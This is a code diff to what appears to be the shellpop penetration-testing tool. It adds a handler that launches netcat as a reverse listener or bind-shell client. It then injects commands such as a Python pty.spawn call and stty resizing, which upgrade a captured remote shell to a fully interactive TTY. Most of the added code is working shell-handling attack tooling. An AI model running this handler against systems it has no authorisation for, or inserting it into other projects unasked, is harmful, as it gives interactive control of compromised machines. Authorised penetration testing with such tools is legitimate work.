@@ -3,8 +3,15 @@
 # I am going to lendo multi/handler module of Metasploit Framework to do this job.
 # This is going to be done mostly because of meterpreter upgrade possibility.
 
+
 from shellpop import *
 from time import sleep
+import traceback
+import subprocess
+import sys
+import signal
+import pty
+import threading
 import termios
 import select
 import socket
@@ -12,7 +19,133 @@ import os
 import fcntl
 import string
 import random
-from os import path, system
+import os
+
+
+class AutoUpgradeHandler(object):
+    """
+    A bind and reverse shell handler that automatically
+    upgrades the handled shell to a full TTY terminal 
+    session. It does this by starting a netcat process
+    and writing commands into it as detailed here:
+    https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method3upgradingfromnetcatwithmagic
+    Code borrowed from here: https://github.com/bad-hombres/supertty
+    Implemented by @capnspacehook
+    """
+    def __init__(self, host, port, bind, proto, shell):
+        self.host = str(host)
+        self.port = str(port)
+        self.bind = bind
+        self.proto = proto
+        self.shell = shell
+        self.event = threading.Event()
+
+
+    def handle(self):
+        if self.bind:
+            if self.proto == "udp":
+                nc_args = ["nc", "-u", self.host, self.port]
+            else:
+                nc_args = ["nc", self.host, self.port]
+
+            print(info("[+] Connecting to a bind shell on: {0}:{1}".format(self.host, self.port)))
+            print(info("Waiting to connect to server, press CTRL-C to cancel"))
+            
+        else:
+            if self.proto == "udp":
+                nc_args = ["nc", "-luvnp", self.port]
+            else:
+                nc_args = ["nc", "-lvnp", self.port]
+
+            print(info("Starting a reverse listener on port: {0}".format(self.port)))
+            print(info("Waiting for connection to client, press CTRL-C to cancel"))
+
+        self.shellStarted = False
+        signal.signal(signal.SIGINT, self.sigint_handler)
+
+        try:
+            master, slave = pty.openpty()
+
+            self.nc_proc = subprocess.Popen(nc_args, stdin=subprocess.PIPE, stdout=slave, stderr=slave, close_fds=True)
+            self.nc_pid = self.nc_proc.pid
+
+        except Exception as e:
+            print(error("Error: Could not start nc process."))
+        
+        try:
+            self.nc_proc.stdout = os.fdopen(os.dup(master), "r+")
+            self.nc_proc.stderr = os.fdopen(os.dup(master), "r+")
+
+            os.close(master)
+            os.close(slave)
+
+            print(self.nc_proc.stdout.read(30))
+
+            fd = self.nc_proc.stdout.fileno()
+            fl = fcntl.fcntl(fd, fcntl.F_GETFL)
+            fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)
+
+            t = threading.Thread(target=self.recv_data)
+            t.start()
+
+            os.system("stty raw -echo")
+            self.nc_proc.stdin.write("python -c 'import pty; pty.spawn(\"{0}\")'\n".format(self.shell))
+            self.nc_proc.stdin.flush()
+            sleep(2)
+
+            term = os.environ["TERM"]
+            rows, columns = os.popen("stty size", "r").read().split()
+            self.nc_proc.stdin.write("export TERM={0}\n".format(term))
+            self.nc_proc.stdin.flush()
+            self.nc_proc.stdin.write("export SHELL={0}\n".format(self.shell))
+            self.nc_proc.stdin.flush()
+            self.nc_proc.stdin.write("stty rows {0} columns {1}\n".format(rows, columns))
+            self.nc_proc.stdin.flush()
+            self.nc_proc.stdin.write("reset\n")
+            self.nc_proc.stdin.flush()
+
+            self.shellStarted = True
+
+            while True:
+                line = sys.stdin.read(1)
+                if ord(line[0]) in [4]: break
+                if line == "": break
+                self.nc_proc.stdin.write(line)
+
+            self.event.set()
+
+        except:
+            print(error("Error: {e}".format(e=traceback.format_exc())))
+            self.exit_shell(1)
+
+
+    def sigint_handler(self, sig, frame):
+        self.exit_shell(0)
+
+
+    def recv_data(self):
+        while not self.event.isSet():
+            try:
+                data = self.nc_proc.stdout.read(1024)
+                if data:
+                    sys.stdout.write(data)
+                    sys.stdout.flush()
+                    if data == "\r\r\nexit\r\r\n":
+                        self.nc_proc.stdin.write(data + "\x04")
+                        self.exit_shell(0)
+            except:
+                pass
+
+
+    def exit_shell(self, code):
+        if self.shellStarted:
+            os.system("stty raw echo")
+            os.system("reset")
+
+        os.kill(self.nc_pid, signal.SIGKILL)
+        print(info("Handler stopped."))
+        os._exit(code)
+
 
 class PTY:
     def __init__(self, slave=0, pid=os.getpid()):
@@ -147,10 +280,6 @@ class TCP_PTY_Handler(object):
         sock.close()
 
 
-def error(err):
-    return "[\033[091m!\033[0m] Error: {0}".format(err)
-
-
 def random_file(n=10):
     """
     Generates a random rc file in /tmp/folder.
@@ -243,6 +372,10 @@ def get_shell_name(shell_obj):
         else:
             return "cmd"
 
+
+def auto_upgrade_handler(args, proto):
+    handler = AutoUpgradeHandler(args.host, args.port, args.bind, proto, "/bin/bash")
+    handler.handle()
 
 def reverse_tcp_handler((args, shell)):
     shell_name = get_shell_name(shell)
